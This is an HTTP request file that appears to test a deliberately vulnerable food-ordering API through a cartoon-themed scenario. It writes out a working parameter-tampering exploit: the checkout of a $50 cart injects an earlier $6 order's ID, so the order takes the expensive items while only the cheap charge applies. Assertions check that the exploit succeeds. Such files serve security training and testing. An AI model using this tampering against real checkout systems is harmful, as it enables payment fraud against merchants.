# @import ../common/setup.http
@base = {{base_host}}/v103

### Plankton orders a side of fries for $6
# @name cheap_cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{cheap_cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "2" }

# @name cheap_order
POST {{base}}/cart/{{cheap_cart.response.body.cart_id}}/checkout
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

tip=0&delivery_address=Chum Bucket

### He fills a new cart with the $50 feast
# @name expensive_cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{expensive_cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "5" }

### Plankton checks out the expensive cart but injects his old order ID
# @name exploit
POST {{base}}/cart/{{expensive_cart.response.body.cart_id}}/checkout
Authorization: {{sandy_auth}}
Content-Type: application/json

{
  "tip": 0,
  "delivery_address": "Chum Bucket",
  "order_id": {{cheap_order.response.body.order_id}}
}

?? status == 201
?? body.order_id == {{cheap_order.response.body.order_id}}
?? body.items[0].item_id == 5

### The order was updated with expensive items, but he was only charged for fries
GET {{base}}/account/info
Authorization: {{sandy_auth}}

?? status == 200
?? js parseFloat(response.body.balance) > 80.00
